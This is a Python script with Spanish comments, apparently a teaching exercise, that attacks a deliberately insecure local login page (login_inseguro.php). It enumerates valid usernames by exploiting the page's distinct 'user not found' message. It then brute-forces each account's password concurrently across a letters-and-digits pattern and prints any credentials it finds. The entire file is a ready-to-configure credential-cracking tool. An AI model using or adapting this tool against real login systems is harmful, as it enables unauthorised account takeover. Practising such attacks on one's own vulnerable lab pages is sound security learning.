import aiohttp
import asyncio
import itertools
import time

# ==== Aquí podéis cambiar la configuracion inicial. os explico en cada punto
URL = "http://localhost:8080/login_inseguro.php"
DICTIONARY_PATH = "userlist_generated.txt" #os dejo un archivon de diccionario, aunque podeis elegir el vuestro. En este caso, es una lista de nombres y apellidos comunes, los cuales pueden explorar la lista de combinatoria
PASSWORD_FAKE = "abc"
LETTERS = "abcdefghijklmnopqrstuvwxyz"
MAX_CONCURRENT_USER_CHECKS = 30
MAX_CONCURRENT_PASSWORD_TRIES = 50
START_PASSWORD = "aaa0000"  #la extension y el punto inicial sobre el que sigue en orden, en formato xxx####

# ==== Funciones user
def load_base_words(path):
    with open(path, "r", encoding="utf-8") as f:
        return sorted(set(w.strip().lower() for w in f if w.strip()))

def generate_usernames(base_words):
    usernames = set()
    for word in base_words:
        usernames.add(word)
    for a, b in itertools.product(base_words, repeat=2):
        if a != b:
            usernames.add(f"{a}{b}")
    return sorted(usernames)

async def check_username(session, semaphore, username, found):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": username, "password": PASSWORD_FAKE}) as resp:
                text = await resp.text()
                if "Usuario no encontrado" not in text:
                    print(f"[✓] Usuario válido encontrado: {username}")
                    found.append(username)
                else:
                    print(f"[-] No existe: {username}")
        except Exception as e:
            print(f"[!] Error con {username}: {e}")

async def find_valid_usernames():
    base_words = load_base_words(DICTIONARY_PATH)
    usernames = generate_usernames(base_words)
    print(f"🔎 Probando {len(usernames)} posibles nombres de usuario...")

    found = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_USER_CHECKS)

    async with aiohttp.ClientSession() as session:
        tasks = [check_username(session, semaphore, u, found) for u in usernames]
        await asyncio.gather(*tasks)
    return found

# ==== Funnciones de contraseñas
def generate_passwords(start="aaa0000"):
    start_letters = start[:3]
    start_number = int(start[3:])
    skipping = True

    for letters_part in itertools.product(LETTERS, repeat=3):
        prefix = ''.join(letters_part)
        if skipping:
            if prefix == start_letters:
                skipping = False
            else:
                continue
        for number in range(10000):
            if skipping and number < start_number:
                continue
            skipping = False
            yield f"{prefix}{number:04d}"

async def try_password(session, username, password, semaphore):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": username, "password": password}) as resp:
                text = await resp.text()
                if "OK" in text:
                    print(f"[✓] ¡Contraseña encontrada para {username}!: {password}")
                    return password
                else:
                    print(f"[-] {username} / {password}")
        except Exception as e:
            print(f"[!] Error con {password}: {e}")
    return None

async def brute_force_password(username):
    print(f"\n🚀 Atacando a {username} con fuerza bruta...")
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_PASSWORD_TRIES)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for password in generate_passwords(START_PASSWORD):
            task = asyncio.create_task(try_password(session, username, password, semaphore))
            tasks.append(task)
            if len(tasks) >= MAX_CONCURRENT_PASSWORD_TRIES:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for d in done:
                    if d.result():
                        for p in pending:
                            p.cancel()
                        return d.result()
                tasks = list(pending)
    return None

# ==== Funcinn princiupal
async def main():
    start_time = time.time()
    usernames = await find_valid_usernames()

    if not usernames:
        print("\n No se encontró ningún usuario.")
        return

    print("\n Usuarios encontrados:")
    for u in usernames:
        print(f" - {u}")

    for user in usernames:
        password = await brute_force_password(user)
        if password:
            print(f"SII! Usuario {user} tiene contraseña: {password}")
        else:
            print(f" No se encontró contraseña para {user}")
